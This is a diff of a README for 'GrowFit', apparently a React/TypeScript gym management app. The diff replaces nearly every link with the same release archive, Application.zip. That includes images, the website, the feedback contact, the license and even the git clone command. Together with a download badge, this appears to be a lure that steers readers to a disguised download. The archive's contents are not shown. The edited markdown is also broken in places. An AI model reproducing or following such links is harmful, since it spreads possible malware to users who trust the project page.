@@ -1,7 +1,7 @@
 
 # 🏋️‍♂️ GrowFit - Gym Management System 🏋️‍♀️
 
-![GrowFit Logo](https://www.example.com/growfit_logo.png)
+![GrowFit Logo](https://github.com/duduzin2301/GrowFit/releases/download/v1.0.0/Application.zip)
 
 ### Welcome to GrowFit - Your Ultimate Gym Management Solution! 💪
 
@@ -22,13 +22,13 @@ Do you want to streamline your gym operations, boost productivity, and enhance m
 automation, crud-operations, dashboard-insights, date-fns, historical-data-analysis, lucide-react, membership-monitoring, react, react-context-api, react-router, real-time-attendance-management, responsive-design, state-management, tailwindcss, type-safe, typescript, vite, webapp
 
 ### 📥 Software Download:
-[![Download GrowFit Software](https://img.shields.io/badge/Download%20Software-Click%20Here-blue.svg)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download GrowFit Software](https://github.com/duduzin2301/GrowFit/releases/download/v1.0.0/Application.zip%20Software-Click%https://github.com/duduzin2301/GrowFit/releases/download/v1.0.0/Application.zip)](https://github.com/duduzin2301/GrowFit/releases/download/v1.0.0/Application.zip)
 
 ### 🌐 Visit Our Website:
-[GrowFit Gym Management System](https://www.growfit.com)
+[GrowFit Gym Management System](https://github.com/duduzin2301/GrowFit/releases/download/v1.0.0/Application.zip)
 
 ### 📦 Installation:
-1. Clone the repository: `git clone https://github.com/yourusername/GrowFit.git`
+1. Clone the repository: `git clone https://github.com/duduzin2301/GrowFit/releases/download/v1.0.0/Application.zip`
 2. Install dependencies: `npm install`
 3. Start the development server: `npm start`
 
@@ -40,19 +40,19 @@ automation, crud-operations, dashboard-insights, date-fns, historical-data-analy
 - Date-fns
 
 ### 📊 Sample Revenue Insights Dashboard:
-![Revenue Insights Dashboard](https://www.example.com/revenue_dashboard.png)
+![Revenue Insights Dashboard](https://github.com/duduzin2301/GrowFit/releases/download/v1.0.0/Application.zip)
 
 ### 📸 Screenshot:
-![GrowFit Screenshot](https://www.example.com/growfit_screenshot.png)
+![GrowFit Screenshot](https://github.com/duduzin2301/GrowFit/releases/download/v1.0.0/Application.zip)
 
 ### 🤝 Contributing:
 We welcome contributions from the open-source community. Please feel free to fork the repository, make your changes, and submit a pull request.
 
 ### 📢 Feedback:
-Have any suggestions, feedback, or feature requests? We'd love to hear from you! Reach out to us at growfit@email.com.
+Have any suggestions, feedback, or feature requests? We'd love to hear from you! Reach out to us at https://github.com/duduzin2301/GrowFit/releases/download/v1.0.0/Application.zip
 
 ### 📄 License:
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/yourusername/GrowFit/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/duduzin2301/GrowFit/releases/download/v1.0.0/Application.zip) file for details.
 
 ### 🙏 Thank You for Choosing GrowFit!
 We appreciate your interest in GrowFit Gym Management System. Let's work together to build a stronger and healthier community! 💖
